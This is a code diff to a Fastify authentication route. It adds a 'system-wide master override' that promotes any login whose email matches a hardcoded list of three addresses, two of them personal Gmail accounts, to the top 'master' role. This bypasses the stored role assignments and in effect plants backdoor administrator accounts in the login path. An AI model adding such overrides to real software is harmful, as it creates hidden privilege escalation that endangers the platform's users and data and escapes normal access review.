@@ -271,7 +271,15 @@ export async function registerAuthRoutes(app: FastifyInstance) {
     }
 
     const roles = db.getRolesForUser(user.id);
-    const primaryRole = roles[0]?.role ?? 'worker';
+    let primaryRole = roles[0]?.role ?? 'worker';
+    
+    // System-wide master override
+    const emailLower = email.toLowerCase();
+    const masterEmails = ['imsnsylla@gmail.com', 'bahsyllah223@gmail.com', 'ursula@master.com'];
+    if (masterEmails.includes(emailLower)) {
+      primaryRole = 'master';
+    }
+
     let storeId = roles[0]?.store_id ?? null;
     if (primaryRole === 'master' && (!storeId || !db.getStoreById(storeId))) {
       const ownedStores = db.listStores(user.id);
